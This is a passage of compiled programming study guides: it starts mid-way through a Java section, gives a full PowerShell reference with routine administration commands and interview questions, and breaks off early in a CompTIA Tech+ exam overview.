listFactory.get();           // New ArrayList each call

BiFunction<Integer, Integer, Integer> add = (a, b) -> a + b;
add.apply(3, 4);             // 7

UnaryOperator<String> upper = String::toUpperCase;
BinaryOperator<Integer> max = Integer::max;

// Method references
// Static: ClassName::staticMethod
Function<String, Integer> parser = Integer::parseInt;
// Instance on fixed object: instance::method
String prefix = "Hello ";
Function<String, String> greet = prefix::concat;
// Instance on parameter type: ClassName::instanceMethod
Function<String, String> upper2 = String::toUpperCase;
// Constructor: ClassName::new
Supplier<ArrayList<String>> newList = ArrayList::new;
Function<String, StringBuilder> newSB = StringBuilder::new;

// Comparator with lambdas
List<String> names = Arrays.asList("Charlie", "Alice", "Bob");
names.sort((a, b) -> a.compareTo(b));
names.sort(Comparator.naturalOrder());
names.sort(Comparator.comparingInt(String::length));
names.sort(Comparator.comparingInt(String::length).thenComparing(Comparator.naturalOrder()));
names.sort(Comparator.reverseOrder());
```

---

## 14. Optional

```java
// Avoid NullPointerException
Optional<String> opt = Optional.of("hello");      // Must be non-null
Optional<String> maybe = Optional.ofNullable(str); // Null safe
Optional<String> empty = Optional.empty();

opt.isPresent()              // true
opt.isEmpty()                // false (Java 11+)
opt.get()                    // "hello" (throws if empty)
opt.orElse("default")        // "default" if empty
opt.orElseGet(() -> compute()) // Lazy evaluation
opt.orElseThrow()            // Throw NoSuchElementException if empty
opt.orElseThrow(() -> new AppException("Not found"))

opt.map(String::toUpperCase)             // Optional<String>
opt.flatMap(s -> Optional.of(s + "!"))   // When mapping returns Optional
opt.filter(s -> s.length() > 3)          // Optional or empty
opt.ifPresent(System.out::println)       // Action if present
opt.ifPresentOrElse(System.out::println, () -> System.out.println("Empty"))
opt.stream()                             // Stream of 0 or 1 elements
```

---

## 15. Multithreading Basics

```java
// Creating threads
// 1. Extend Thread
class MyThread extends Thread {
    @Override public void run() {
        System.out.println("Thread: " + Thread.currentThread().getName());
    }
}
new MyThread().start();

// 2. Implement Runnable (preferred)
Runnable task = () -> System.out.println("Running!");
Thread t = new Thread(task, "MyThread");
t.start();
t.join();           // Wait for thread to finish
t.join(1000);       // Wait up to 1 second

// Thread states: NEW → RUNNABLE → (BLOCKED/WAITING/TIMED_WAITING) → TERMINATED

// ExecutorService (preferred over raw threads)
ExecutorService executor = Executors.newFixedThreadPool(4);
executor.execute(() -> doWork());             // Submit Runnable
Future<Integer> future = executor.submit(() -> compute());  // Submit Callable
Integer result = future.get();                // Block and get result
future.get(5, TimeUnit.SECONDS);             // With timeout
executor.shutdown();
executor.awaitTermination(10, TimeUnit.SECONDS);

// Thread-safe collections
ConcurrentHashMap<String, Integer> concurrentMap = new ConcurrentHashMap<>();
CopyOnWriteArrayList<String> cowList = new CopyOnWriteArrayList<>();
BlockingQueue<String> blockingQueue = new LinkedBlockingQueue<>();
AtomicInteger counter = new AtomicInteger(0);
counter.incrementAndGet();
counter.compareAndSet(expected, newValue);

// synchronized
public synchronized void increment() { count++; }
synchronized (lock) { // Block-level synchronization
    count++;
}

// volatile (visibility guarantee only, not atomicity)
private volatile boolean running = true;
```

---

## 16. Java Interview Questions

**Q: What is the difference between `==` and `.equals()` in Java?**
A: `==` compares object references (memory addresses). `.equals()` compares content/value. For strings, always use `.equals()`. Primitives should use `==`.

**Q: What is the difference between an abstract class and an interface?**
A: Abstract classes can have state (fields), constructors, and both abstract and concrete methods. A class can only extend one abstract class. Interfaces can only have constants and method signatures (plus default/static methods in Java 8+). A class can implement multiple interfaces.

**Q: What is autoboxing?**
A: Automatic conversion between primitive types (`int`, `double`) and their wrapper class counterparts (`Integer`, `Double`). Can cause performance issues and `NullPointerException` if unboxing a `null` wrapper.

**Q: What is the difference between `ArrayList` and `LinkedList`?**
A: `ArrayList` uses a dynamic array — fast random access O(1), slow insert/delete in middle O(n). `LinkedList` uses a doubly-linked list — slow random access O(n), fast insert/delete at ends O(1).

**Q: What is the difference between `HashMap` and `Hashtable`?**
A: `HashMap` is not synchronized (not thread-safe) and allows one `null` key. `Hashtable` is synchronized (thread-safe) but slower, and doesn't allow `null` keys. Use `ConcurrentHashMap` for thread-safe needs.

**Q: What is a `checked` vs `unchecked` exception?**
A: Checked exceptions (like `IOException`) extend `Exception` directly and must be declared in the method signature or caught. Unchecked exceptions (like `NullPointerException`) extend `RuntimeException` and don't need to be declared.

**Q: What are Java Streams?**
A: A declarative API for processing collections of data. Streams are lazy (nothing executes until a terminal operation is called), can be parallelized easily, and support functional-style operations like `map`, `filter`, and `reduce`.

---

*End of Java Study Guide*


---

# PowerShell — Complete Study Guide

---

## 1. What Is PowerShell?

PowerShell is a **cross-platform task automation framework** consisting of a command-line shell, a scripting language, and a configuration management framework. Unlike traditional shells (bash, cmd) that work with text, **PowerShell works with .NET objects** — piping structured data instead of raw text strings.

Originally Windows-only (Windows PowerShell, v1-5.1), now cross-platform as **PowerShell 7+** (formerly PowerShell Core).

Key uses: system administration, automation, DevOps, Active Directory, Azure/AWS cloud management, Windows configuration.

---

## 2. PowerShell Basics

```powershell
# Get help
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples
Get-Help Get-Process -Online
Update-Help                          # Download latest help

# Discover commands
Get-Command
Get-Command -Verb Get
Get-Command -Noun Process
Get-Command -Module ActiveDirectory
Get-Command *firewall*

# Explore objects
Get-Process | Get-Member             # Show all properties and methods
Get-Process | Select-Object -First 1 | Format-List *  # All properties

# Version and environment
$PSVersionTable                      # PowerShell version info
$Host.Version
$env:OS
$env:COMPUTERNAME
$env:USERNAME
$env:USERPROFILE
$env:PATH

# Execution Policy
Get-ExecutionPolicy
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
# Unrestricted, RemoteSigned, AllSigned, Restricted, Bypass

# Profiles
$PROFILE                             # Path to your profile script
Test-Path $PROFILE
New-Item -Path $PROFILE -Type File -Force
notepad $PROFILE                     # Edit profile
```

---

## 3. Cmdlet Naming Convention

PowerShell uses **Verb-Noun** naming:

```powershell
# Common verbs
Get-*      # Retrieve data
Set-*      # Change settings
New-*      # Create new items
Remove-*   # Delete items
Add-*      # Add to a collection
Clear-*    # Remove content
Copy-*     # Duplicate items
Move-*     # Move items
Rename-*   # Rename items
Start-*    # Begin a process/service
Stop-*     # End a process/service
Restart-*  # Stop then start
Enable-*   # Turn on
Disable-*  # Turn off
Test-*     # Test/check something
Invoke-*   # Execute something
Import-*   # Import from external
Export-*   # Export to external
Out-*      # Send output somewhere
Format-*   # Format output
Convert-*  # Convert between types
Select-*   # Select part of data
Sort-*     # Sort data
Where-*    # Filter data
ForEach-*  # Iterate
Measure-*  # Calculate metrics
Compare-*  # Compare objects
Write-*    # Write to output streams
Read-*     # Read from input
```

---

## 4. Variables

```powershell
# Variable names start with $ — case-insensitive
$name = "Alice"
$age = 25
$pi = 3.14
$active = $true           # NOT just true
$nothing = $null

# Type constraints
[int]$count = 0
[string]$text = "hello"
[double]$price = 9.99
[datetime]$date = "2024-01-15"
[bool]$flag = $false
[array]$list = @(1,2,3)
[hashtable]$map = @{}

# Multiple assignment
$a = $b = $c = 0
$x, $y, $z = 1, 2, 3

# Swap
$a, $b = $b, $a

# Read-Only / Constant
New-Variable -Name "MAX" -Value 100 -Option ReadOnly
New-Variable -Name "PI" -Value 3.14159 -Option Constant

# Variable cmdlets
Get-Variable                        # List all variables
Get-Variable -Name "name"
Set-Variable -Name "count" -Value 5
Remove-Variable -Name "temp"
Clear-Variable -Name "count"        # Set to null

# Automatic variables
$_           # Current object in pipeline
$PSItem      # Same as $_
$$           # Last token of last command
$?           # Success status of last command (bool)
$^           # First token of last command
$args        # Arguments array
$Error       # Array of recent errors
$Error[0]    # Most recent error
$LastExitCode # Exit code of last native command
$null        # Null value
$true, $false
$home        # User's home directory
$env:*       # Environment variables
$PID         # Current process ID
$PSCommandPath  # Full path of script
$PSScriptRoot   # Directory of script
$MyInvocation   # Script invocation details
$input          # Piped input to a function/script
$PSDefaultParameterValues  # Default parameter values
```

---

## 5. Data Types and Strings

```powershell
# Strings
$s = "Hello, World!"
$s = 'Single quotes (no interpolation)'

# String interpolation (double quotes only)
$name = "Alice"
"Hello, $name!"               # "Hello, Alice!"
"She said `"hello`""          # Escape with backtick
"Tab:`there"                  # Tab character
"New`nLine"                   # Newline

# Here-strings (multi-line)
$text = @"
    This is a
    multi-line string with $name interpolated
    and "quotes" work fine
"@

$literal = @'
    No $interpolation here
    Everything is literal
'@

# String methods (all .NET methods available)
$s.Length                     # 13
$s.ToUpper()                  # "HELLO, WORLD!"
$s.ToLower()
$s.Trim()
$s.TrimStart()
$s.TrimEnd()
$s.Replace("World", "PS")
$s.Split(", ")                # Array
$s.Contains("World")          # True
$s.StartsWith("Hello")        # True
$s.EndsWith("!")              # True
$s.IndexOf("World")           # 7
$s.Substring(7, 5)            # "World"
$s.PadLeft(20)
$s.PadRight(20, '*')
[string]::Join(", ", @("a","b","c"))  # "a, b, c"
-join @("a", "b", "c")              # "abc"
"hello" -join ", "                   # Not the same! Left side must be array

# String operators
"Hello" + " World"           # Concatenation
"ab" * 3                     # "ababab"
"Hello" -eq "hello"          # True (case-insensitive by default)
"Hello" -ceq "hello"         # False (case-sensitive)
"Hello" -ne "World"          # True
"hello" -like "hel*"         # Wildcard match
"hello" -notlike "hel*"      # False
"hello" -match "^h.l"        # Regex match (True) and populates $Matches
"hello" -replace "l", "L"    # "heLLo" (regex replace)
"heLLo" -creplace "[A-Z]","x" # Case-sensitive replace
$Matches[0]                   # Full match from -match
$Matches[1]                   # First capture group
"hello" -in "hello","world"  # True (membership)
"hello" -notin "world","foo" # True

# Format strings
"Hello, {0}! You are {1} years old." -f $name, $age
"{0:C}" -f 1234.56           # "$1,234.56" (currency)
"{0:N2}" -f 3.14159          # "3.14"
"{0:P}" -f 0.853             # "85.30%"
"{0:X}" -f 255               # "FF"
"{0:D8}" -f 42               # "00000042"
```

---

## 6. Numbers and Math

```powershell
# Numeric types
$int   = 42
$long  = 9999999999
$float = 3.14
$hex   = 0xFF                # 255
$binary = 0b11111111         # 255 (PS 6+)
$kb    = 1KB                 # 1024
$mb    = 1MB                 # 1048576
$gb    = 1GB
$tb    = 1TB

# Arithmetic
5 + 3; 5 - 3; 5 * 3; 5 / 3; 5 % 3
[Math]::Pow(2, 10)           # 1024
[Math]::Sqrt(16)             # 4
[Math]::Abs(-5)              # 5
[Math]::Round(3.14, 1)       # 3.1
[Math]::Floor(3.9)           # 3
[Math]::Ceiling(3.1)         # 4
[Math]::Max(5, 10)           # 10
[Math]::Min(5, 10)           # 5
[Math]::Log(100, 10)         # 2
[Math]::PI
[Math]::E

# Comparison operators
-eq  -ne  -lt  -le  -gt  -ge    # Equal, not equal, less, etc.
-and  -or  -not  -xor
!                               # Same as -not
```

---

## 7. Arrays and Collections

```powershell
# Arrays
$arr = @(1, 2, 3, 4, 5)
$arr = 1, 2, 3, 4, 5         # Comma creates arrays
$empty = @()
$single = @(1)               # Force single-element array
$range = 1..10               # [1,2,3,...,10]
$letters = 'a'..'z'          # ['a','b',...,'z']

# Access
$arr[0]                      # 1 (first)
$arr[-1]                     # 5 (last)
$arr[0..2]                   # [1,2,3] (slice)
$arr[-3..-1]                 # [3,4,5] (last 3)
$arr[0,2,4]                  # [1,3,5] (specific indices)

# Modification (creates new array!)
$arr += 6                    # Append (inefficient — creates new array)
$arr = $arr[0..3]            # Remove last element

# Properties and methods
$arr.Length                  # 5
$arr.Count                   # 5
$arr.Contains(3)             # True
$arr.IndexOf(3)              # 2
[array]::Reverse($arr)       # Reverse in place
[array]::Sort($arr)          # Sort in place
$arr | Sort-Object           # Sort (returns new array)
$arr | Sort-Object -Descending
$arr | Where-Object { $_ -gt 3 }   # Filter
$arr | ForEach-Object { $_ * 2 }   # Transform
$arr | Measure-Object -Sum  # Statistics
($arr | Measure-Object -Sum).Sum
$arr | Select-Object -First 3
$arr | Select-Object -Last 2
$arr | Select-Object -Unique

# ArrayList (more efficient for adding/removing)
$list = [System.Collections.ArrayList]@()
$list.Add("item1")
$list.Add("item2")
$list.Remove("item1")
$list.RemoveAt(0)
$list.Insert(0, "new first")
$list.Count

# Generic List (strongly typed)
$list = [System.Collections.Generic.List[string]]::new()
$list.Add("hello")
$list.Contains("hello")

# Hashtables (key-value pairs)
$hash = @{
    Name    = "Alice"
    Age     = 25
    Active  = $true
}

$hash["Name"]                # "Alice"
$hash.Name                   # "Alice" (dot notation)
$hash["City"] = "NYC"        # Add key
$hash.Remove("City")         # Remove key
$hash.ContainsKey("Name")    # True
$hash.ContainsValue("Alice") # True
$hash.Keys
$hash.Values
$hash.Count

# Ordered hashtable
$ordered = [ordered]@{
    First  = 1
    Second = 2
    Third  = 3
}

# Hashtable operations
$hash.GetEnumerator() | Sort-Object -Property Name
$hash + @{Email = "alice@example.com"}   # Merge (creates new)

# Splatting (pass hashtable as parameters)
$params = @{
    ComputerName = "Server01"
    Credential   = $cred
}
Get-Process @params
```

---

## 8. Control Flow

```powershell
# if / elseif / else
if ($score -ge 90) {
    Write-Output "A"
} elseif ($score -ge 80) {
    Write-Output "B"
} else {
    Write-Output "F"
}

# Switch
switch ($day) {
    "Monday"    { "Start of week" }
    "Friday"    { "End of week" }
    { $_ -in "Saturday","Sunday" } { "Weekend" }
    default     { "Midweek" }
}

# Switch with regex
switch -Regex ($text) {
    "^\d+"   { "Starts with numbers" }
    "^[A-Z]" { "Starts with uppercase" }
}

# Switch with file input
switch -File "data.txt" {
    "error" { Write-Warning $_ }
    default { Write-Output $_ }
}

# for
for ($i = 0; $i -lt 10; $i++) {
    Write-Output $i
}

# foreach
foreach ($item in $collection) {
    Write-Output $item
}

$numbers | ForEach-Object {
    $_ * 2
}
# ForEach-Object shorthand (PS 3+)
$numbers | ForEach-Object -MemberName ToString
1..10 | % { $_ * 2 }   # % is alias for ForEach-Object

# while
$i = 0
while ($i -lt 10) {
    $i++
}

# do-while
do {
    $input = Read-Host "Enter number"
} while ($input -notmatch "^\d+$")

# do-until
do {
    $tries++
} until ($success -or $tries -gt 5)

# Loop control
break               # Exit loop
continue            # Next iteration

# Parallel ForEach (PS 7+)
1..10 | ForEach-Object -Parallel {
    Start-Sleep -Milliseconds 100
    $_
} -ThrottleLimit 5
```

---

## 9. Functions

```powershell
# Basic function
function Get-Greeting {
    param (
        [string]$Name = "World",
        [int]$Times = 1
    )
    for ($i = 0; $i -lt $Times; $i++) {
        "Hello, $Name!"
    }
}
Get-Greeting -Name "Alice" -Times 3
Get-Greeting "Alice"   # Positional

# Advanced functions (with CmdletBinding)
function New-User {
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact='Medium')]
    param (
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(Mandatory)]
        [ValidateSet("Admin", "User", "Guest")]
        [string]$Role,

        [Parameter()]
        [ValidateRange(1, 100)]
        [int]$Age,

        [Parameter()]
        [ValidatePattern("^[\w.-]+@[\w.-]+\.\w{2,}$")]
        [string]$Email,

        [Parameter()]
        [ValidateScript({ Test-Path $_ })]
        [string]$ProfilePath,

        [switch]$PassThru
    )

    begin {
        Write-Verbose "Starting New-User function"
    }

    process {
        if ($PSCmdlet.ShouldProcess($Name, "Create user")) {
            $user = [PSCustomObject]@{
                Name  = $Name
                Role  = $Role
                Age   = $Age
                Email = $Email
            }
            Write-Verbose "Created user: $Name"

            if ($PassThru) { $user }
        }
    }

    end {
        Write-Verbose "Completed New-User function"
    }
}

# Usage
New-User -Name "Alice" -Role "Admin" -Age 25
New-User -Name "Bob" -Role "User" -WhatIf    # Preview
New-User -Name "Carol" -Role "Guest" -Verbose
"Dave","Eve" | New-User -Role "User"         # Pipeline input

# Filter function (process each pipeline item)
filter Get-LargeFiles {
    if ($_.Length -gt 1MB) { $_ }
}
Get-ChildItem -Recurse | Get-LargeFiles

# Return values
function Get-Double {
    param ([int]$n)
    return $n * 2   # return keyword optional — any unassigned output is returned
}

# Multiple return values (as array)
function Get-MinMax {
    param ([int[]]$numbers)
    return @(
        ($numbers | Measure-Object -Minimum).Minimum,
        ($numbers | Measure-Object -Maximum).Maximum
    )
}
$min, $max = Get-MinMax -numbers 3,1,4,1,5,9
```

---

## 10. The Pipeline

```powershell
# Pipeline passes objects, not text
Get-Process | Where-Object { $_.CPU -gt 10 } | Sort-Object CPU -Descending | Select-Object -First 5

# Pipeline aliases
Where-Object  → where, ?
ForEach-Object → foreach, %
Select-Object  → select

# Pipeline variables
# $_ and $PSItem refer to the current pipeline object

# Select properties
Get-Process | Select-Object Name, CPU, WorkingSet
Get-Process | Select-Object -Property Name, @{N="Memory(MB)"; E={[math]::Round($_.WorkingSet/1MB, 2)}}

# Calculated properties
Get-ChildItem | Select-Object Name, @{N="SizeMB"; E={[math]::Round($_.Length/1MB,2)}}

# Where-Object filter methods
Get-Process | Where-Object CPU -gt 10
Get-Process | Where-Object -FilterScript { $_.Name -like "chrome*" -and $_.CPU -gt 5 }
Get-Service | Where-Object Status -eq "Running"

# Sort-Object
Get-Process | Sort-Object CPU
Get-Process | Sort-Object CPU -Descending
Get-Process | Sort-Object @{E="Name"; A=$true}, @{E="CPU"; A=$false}

# Group-Object
Get-Process | Group-Object -Property Name
Get-Service | Group-Object Status

# Measure-Object
Get-Process | Measure-Object CPU -Sum -Average -Maximum -Minimum
Get-ChildItem -Recurse | Measure-Object -Property Length -Sum
(Get-Content file.txt | Measure-Object -Line -Word -Character)

# Compare-Object
Compare-Object (Get-Content file1.txt) (Get-Content file2.txt)
Compare-Object $baseline $current -Property Name

# Tee-Object (send to file AND keep in pipeline)
Get-Process | Tee-Object -FilePath "processes.txt" | Where-Object CPU -gt 10

# Output formatting
Get-Process | Format-Table Name, CPU, WorkingSet -AutoSize
Get-Process | Format-List *
Get-Service | Format-Wide Name -Column 4
Get-Process | Out-GridView       # Pop-up grid (Windows GUI)
Get-Process | Out-GridView -PassThru | Stop-Process  # Select in GUI, pipe result
```

---

## 11. File System and I/O

```powershell
# Navigation
Get-Location            # pwd
Set-Location "C:\Users" # cd
Push-Location "C:\temp" # Save current, go to new
Pop-Location            # Return to saved location
Set-Location ~          # Home directory

# File and directory operations
Get-ChildItem                           # ls / dir
Get-ChildItem -Recurse
Get-ChildItem -Filter "*.ps1"
Get-ChildItem -Include "*.txt","*.log" -Recurse
Get-ChildItem -Exclude "*.tmp" -Recurse
Get-ChildItem | Where-Object { !$_.PSIsContainer }    # Files only
Get-ChildItem | Where-Object PSIsContainer            # Directories only

New-Item -Path "folder" -ItemType Directory
New-Item -Path "file.txt" -ItemType File
New-Item -Path "file.txt" -ItemType File -Force       # Overwrite

Copy-Item "source.txt" "dest.txt"
Copy-Item "folder" "backup" -Recurse

Move-Item "old.txt" "new.txt"
Move-Item "file.txt" "C:\backup\"

Rename-Item "old.txt" "new.txt"

Remove-Item "file.txt"
Remove-Item "folder" -Recurse
Remove-Item "file.txt" -Force           # No confirmation
Remove-Item *.tmp -WhatIf              # Preview what would be deleted

Test-Path "file.txt"                    # True/False
Test-Path "C:\Users" -PathType Container  # Is it a directory?
Test-Path "file.txt" -PathType Leaf      # Is it a file?

Split-Path "C:\Users\Alice\file.txt" -Parent    # "C:\Users\Alice"
Split-Path "C:\Users\Alice\file.txt" -Leaf      # "file.txt"
Split-Path "C:\Users\Alice\file.txt" -Extension # ".txt"  (PS 6+)
Join-Path "C:\Users" "Alice" "Documents"        # "C:\Users\Alice\Documents"
Resolve-Path "~\Desktop\*.txt"          # Expand wildcards/tilde
[System.IO.Path]::GetTempFileName()

# Reading files
Get-Content "file.txt"                  # Returns string array (one element per line)
Get-Content "file.txt" -Raw            # Entire file as single string
Get-Content "file.txt" -TotalCount 10  # First 10 lines
Get-Content "file.txt" -Tail 20        # Last 20 lines
Get-Content "file.txt" -Wait           # tail -f equivalent
Get-Content "large.bin" -Encoding Byte -ReadCount 1024  # Read binary

# Writing files
Set-Content "file.txt" "Hello, World!"         # Write (overwrite)
Add-Content "file.txt" "New line"              # Append
Out-File "output.txt"                          # From pipeline
"Hello" | Out-File "file.txt" -Append
"Hello" | Set-Content "file.txt" -Encoding UTF8

# CSV
Import-Csv "data.csv"
Import-Csv "data.csv" -Delimiter ";"
Export-Csv "output.csv" -NoTypeInformation
$objects | Export-Csv "output.csv" -NoTypeInformation -Append

# JSON (PS 3+)
$data = Get-Content "data.json" -Raw | ConvertFrom-Json
$json = $object | ConvertTo-Json -Depth 10
$json | Set-Content "output.json"

# XML
[xml]$doc = Get-Content "config.xml"
$doc.SelectNodes("//server")
$doc.configuration.settings.key
$doc.Save("config.xml")

# Invoke-WebRequest
$response = Invoke-WebRequest -Uri "https://api.example.com/data"
$response.StatusCode
$response.Content
$response.Headers
$data = $response.Content | ConvertFrom-Json

Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "file.zip"
```

---

## 12. Process and Service Management

```powershell
# Processes
Get-Process
Get-Process -Name "chrome"
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Process | Where-Object { $_.WorkingSet -gt 100MB }

Start-Process "notepad.exe"
Start-Process "cmd.exe" -ArgumentList "/c dir" -Wait -NoNewWindow
Start-Process "program.exe" -Credential $cred -RunAs
Start-Process "powershell.exe" -Verb RunAs  # Elevated

Stop-Process -Name "notepad"
Stop-Process -Id 1234
Stop-Process -Name "chrome" -Force

Wait-Process -Name "setup" -Timeout 300

# Services
Get-Service
Get-Service -Name "wuauserv"
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"

Start-Service -Name "Spooler"
Stop-Service  -Name "Spooler"
Restart-Service -Name "Spooler" -Force
Suspend-Service -Name "Spooler"
Resume-Service  -Name "Spooler"

Set-Service -Name "Spooler" -StartupType Automatic
Set-Service -Name "Spooler" -Status Running -Description "Print Spooler"

New-Service -Name "MyService" -BinaryPathName "C:\MyApp\service.exe"
Remove-Service -Name "MyService"  # PS 6+
```

---

## 13. Error Handling

```powershell
# $ErrorActionPreference
$ErrorActionPreference = "Stop"     # All errors become terminating
$ErrorActionPreference = "Continue" # Default: display and continue
$ErrorActionPreference = "SilentlyContinue"  # Suppress errors
$ErrorActionPreference = "Inquire"  # Ask user each time

# -ErrorAction parameter (per command)
Get-Item "missing.txt" -ErrorAction SilentlyContinue
Get-Item "missing.txt" -ErrorAction Stop

# -ErrorVariable (capture errors)
Get-Item "missing.txt" -ErrorAction SilentlyContinue -ErrorVariable myError
$myError.Exception.Message

# try/catch/finally
try {
    $result = 10 / 0
    Get-Item "C:\nonexistent" -ErrorAction Stop
} catch [System.DivideByZeroException] {
    Write-Error "Division by zero!"
} catch [System.IO.FileNotFoundException] {
    Write-Warning "File not found"
} catch {
    # Catch all other exceptions
    Write-Error "Unexpected error: $_"
    Write-Error $_.Exception.Message
    Write-Error $_.Exception.GetType().FullName
    Write-Error $_.ScriptStackTrace
} finally {
    Write-Output "Cleanup"
}

# Throw custom errors
throw "Something went wrong"
throw [System.ArgumentException]::new("Invalid argument")

# $Error automatic variable
$Error                          # All recent errors
$Error[0]                       # Most recent
$Error.Clear()                  # Clear error list

# Checking command success
if ($?) { "Last command succeeded" }
$LASTEXITCODE                   # Exit code of native exe
```

---

## 14. Remoting

```powershell
# Enable remoting (run as admin)
Enable-PSRemoting -Force

# One-to-one interactive session
Enter-PSSession -ComputerName "Server01"
Enter-PSSession -ComputerName "Server01" -Credential (Get-Credential)
Exit-PSSession

# One-to-many (invoke commands on multiple machines)
Invoke-Command -ComputerName "Server01","Server02" -ScriptBlock {
    Get-Process
    Restart-Service "Spooler"
}

Invoke-Command -ComputerName $servers -ScriptBlock {
    param($serviceName)
    Get-Service -Name $serviceName
} -ArgumentList "Spooler"

# Persistent sessions
$session = New-PSSession -ComputerName "Server01"
Invoke-Command -Session $session -ScriptBlock { whoami }
Enter-PSSession -Session $session
Remove-PSSession -Session $session

# Import remote module
Import-PSSession -Session $session -Module ActiveDirectory

# Copy files over remoting
Copy-Item -Path "C:\local\file.txt" -Destination "C:\remote\" -ToSession $session

# SSH-based remoting (PS 7+, cross-platform)
Enter-PSSession -HostName "linux-server" -UserName "alice"
Invoke-Command -HostName "linux-server" -UserName "alice" -ScriptBlock { ls /etc }
```

---

## 15. Modules and Scripts

```powershell
# Modules
Get-Module                           # Loaded modules
Get-Module -ListAvailable            # All installed modules
Import-Module ActiveDirectory
Import-Module ActiveDirectory -Force # Reload
Remove-Module ActiveDirectory
Find-Module -Name "Pester"           # Search PowerShell Gallery
Install-Module -Name "Pester"        # Install from Gallery
Update-Module -Name "Pester"
Uninstall-Module -Name "Pester"

# Script structure (script.ps1)
#Requires -Version 7.0
#Requires -Modules ActiveDirectory
#Requires -RunAsAdministrator

[CmdletBinding()]
param (
    [Parameter(Mandatory)]
    [string]$Target,
    [switch]$Verbose
)

# Dot-sourcing (load functions into current scope)
. .\functions.ps1
. "$PSScriptRoot\helpers.ps1"

# Invoke as new scope
& .\script.ps1

# Script signing
$cert = Get-ChildItem -Path Cert:\CurrentUser\My -CodeSigningCert
Set-AuthenticodeSignature -FilePath "script.ps1" -Certificate $cert

# Creating a module (myModule.psm1)
function Get-MyData {
    param([string]$query)
    # ...
}

Export-ModuleMember -Function "Get-MyData"   # Public
# Functions without Export are private

# Module manifest (myModule.psd1)
New-ModuleManifest -Path "myModule.psd1" `
    -RootModule "myModule.psm1" `
    -Author "Alice" `
    -Description "My module" `
    -FunctionsToExport @("Get-MyData")
```

---

## 16. Common Administrative Tasks

```powershell
# Registry
Get-Item "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
Get-ItemProperty "HKLM:\SOFTWARE\..." -Name "ProgramFilesDir"
Set-ItemProperty "HKCU:\Software\MyApp" -Name "Setting" -Value "Value"
New-Item "HKCU:\Software\MyApp"
Remove-Item "HKCU:\Software\MyApp" -Recurse

# Event log
Get-EventLog -LogName System -Newest 20
Get-EventLog -LogName System -EntryType Error -Newest 10
Get-EventLog -LogName Application -Source "MSSQLSERVER"
Get-WinEvent -LogName System -MaxEvents 50     # Newer, more powerful
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624}  # Logins

# Network
Test-NetConnection -ComputerName "google.com"
Test-NetConnection -ComputerName "server" -Port 443
Test-Connection -TargetName "8.8.8.8" -Count 4
Get-NetAdapter
Get-NetIPAddress
Get-NetIPConfiguration
Resolve-DnsName "example.com"
Get-NetTCPConnection | Where-Object State -eq "Established"

# Scheduled tasks
Get-ScheduledTask
Get-ScheduledTask -TaskName "WindowsUpdate"
Start-ScheduledTask -TaskName "MyTask"
Enable-ScheduledTask -TaskName "MyTask"
Disable-ScheduledTask -TaskName "MyTask"

$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\script.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At "2:00 AM"
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable
Register-ScheduledTask -TaskName "MyTask" -Action $action -Trigger $trigger -Settings $settings

# Windows Management Instrumentation (WMI)
Get-WmiObject -Class Win32_ComputerSystem
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, @{N="FreeGB"; E={[math]::Round($_.FreeSpace/1GB,2)}}
Get-WmiObject -Class Win32_Process | Where-Object Name -eq "notepad.exe"

# CIM (modern WMI)
Get-CimInstance -ClassName Win32_ComputerSystem
Get-CimInstance -ClassName Win32_Service | Where-Object State -eq "Running"
```

---

## 17. PowerShell Interview Questions

**Q: What is the PowerShell pipeline and what makes it different from bash?**
A: PowerShell pipes **.NET objects** between commands, not text. This means downstream commands can access properties and methods without parsing strings. Bash pipes raw text that must be parsed.

**Q: What is the difference between `Write-Output`, `Write-Host`, and `Write-Verbose`?**
A: `Write-Output` puts objects into the pipeline (can be captured/redirected). `Write-Host` writes directly to the console (bypasses pipeline). `Write-Verbose` writes to the Verbose stream (only shown when `-Verbose` flag is used or `$VerbosePreference = "Continue"`).

**Q: What is splatting?**
A: Passing parameters as a hashtable using `@` instead of `$`. Useful for long parameter lists and conditional parameters: `$params = @{Name="x"}; Get-Process @params`.

**Q: What does `$_` mean?**
A: The current pipeline object, also accessible as `$PSItem`. Inside `ForEach-Object`, `Where-Object`, or script blocks in the pipeline, `$_` refers to each incoming object.

**Q: What is the difference between `=` and `-eq`?**
A: `=` is assignment. `-eq` is comparison (equal to). PowerShell uses word-based comparison operators (`-eq`, `-ne`, `-lt`, `-gt`, `-like`, `-match`) instead of symbols.

**Q: What is the `[CmdletBinding()]` attribute?**
A: Turns a function into an advanced function, adding support for `-Verbose`, `-Debug`, `-WhatIf`, `-Confirm`, `-ErrorAction`, and other common parameters automatically.

---

*End of PowerShell Study Guide*


---

# CompTIA Tech+ (FC0-U71) — Complete Study Guide

---

## 1. Exam Overview

**Exam Code:** FC0-U71  
**Exam Name:** CompTIA Tech+  
**Questions:** 75 multiple-choice  
**Time Limit:** 60 minutes  
**Passing Score:** 650 (on a 100–900 scale)  
**Recommended Experience:** No prerequisites (entry-level)

### Domain Breakdown

| Domain | Weight |
|--------|--------|
| 1. IT Concepts and Terminology | 17% |
| 2. Infrastructure | 22% |
| 3. Applications and Software | 18% |
| 4. Software Development Concepts | 12% |
| 5. Database Fundamentals | 11% |
| 6. Security | 20% |

---

## 2. Domain 1: IT Concepts and Terminology

### Notational Systems

| System | Base | Digits | Use |
|--------|------|--------|-----|
| Binary | 2 | 0–1 | How computers store data |
| Octal | 8 | 0–7 | File permissions (Unix) |
| Decimal | 10 | 0–9 | Human-readable numbers |
| Hexadecimal | 16 | 0–F | Memory addresses, colors |

**Converting decimal to binary:**
- 42 ÷ 2 = 21 R 0 → Read remainders bottom-up
